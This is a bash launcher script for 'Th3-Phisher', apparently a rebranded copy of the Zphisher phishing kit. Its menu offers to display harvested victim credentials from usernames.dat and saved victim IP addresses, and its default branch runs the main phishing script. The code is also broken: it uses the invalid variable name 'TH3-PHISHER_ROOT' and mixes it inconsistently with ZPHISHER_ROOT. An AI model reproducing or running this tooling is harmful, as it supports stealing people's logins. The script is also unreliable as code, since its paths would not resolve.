#!/bin/bash

# https://github.com/Th3-C0der/Th3-Phisher

if [[ $(uname -o) == *'Android'* ]];then
	TH3-PHISHER_ROOT="/data/data/com.termux/files/usr/opt/Th3-Phisher"
else
	export ZPHISHER_ROOT="/opt/Th3-Phisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Th3-Phisher type \`Th3-Phisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $TH3-PHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $TH3-PHISHER_ROOT
	bash ./Th3-Phisher.sh
fi
